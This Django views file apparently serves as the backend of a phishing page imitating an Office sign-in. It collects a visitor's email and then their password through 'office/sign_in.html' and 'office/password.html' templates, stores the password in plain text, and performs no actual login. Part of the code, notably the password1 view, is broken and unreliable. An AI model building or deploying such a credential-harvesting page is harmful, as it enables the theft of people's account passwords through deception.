from django.shortcuts import render, redirect
from .models import mail_user
from django.http import HttpResponse
from utils import verify_email
# Create your views here.
 
def Homepage(request):
    if request.method == "POST":
        print("True", True)
        email = request.POST.get("email")
        if verify_email(email) == True:
            print(email)
            mail_user.objects.create(email=email)
            return redirect(secondpage, data=email)
        return HttpResponse("Invalid email")
    else:
        return render(request, "office/sign_in.html")
    

def secondpage(request, data):
    current_user = mail_user.objects.get(email=data)
    if current_user:
        if request.method == "POST":
            password = request.POST.get("password")
            current_user.password = password
            current_user.save()
            return HttpResponse("Data has been saved")
        else:
            return render(request, "office/password.html", {'data': data})



def password1(request):
    new_password = (["GET"])
    if request.method == "GET":
        return render(request, "office/password.html")
    else:
        password = request.POST.get("password")
        if password.is_valid():
            mail_user.objects.create(password=password)
            return redirect("office/password.html")

        

 